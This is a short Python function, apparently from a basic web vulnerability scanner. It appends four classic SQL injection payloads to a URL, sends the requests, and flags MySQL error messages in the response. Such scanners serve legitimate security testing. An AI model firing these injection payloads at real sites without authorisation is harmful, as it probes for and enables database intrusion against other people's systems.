import requests
from requests.exceptions import ConnectionError, HTTPError

def scan_sql_injection(url):
    """Scan for SQL Injection vulnerabilities"""
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "' OR 'a'='a"]
    try:
        for payload in payloads:
            target_url = f"{url}{payload}"
            response = requests.get(target_url)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text:
                print(f"[+] SQL Injection vulnerability detected at {target_url}")
                return True
        
        print("[-] No SQL Injection vulnerability found")
        return False
    
    except ConnectionError as e:
        print(f"Connection error occurred: {e}")
        return False

    except HTTPError as e:
        print(f"HTTP error occurred: {e}")
        return False

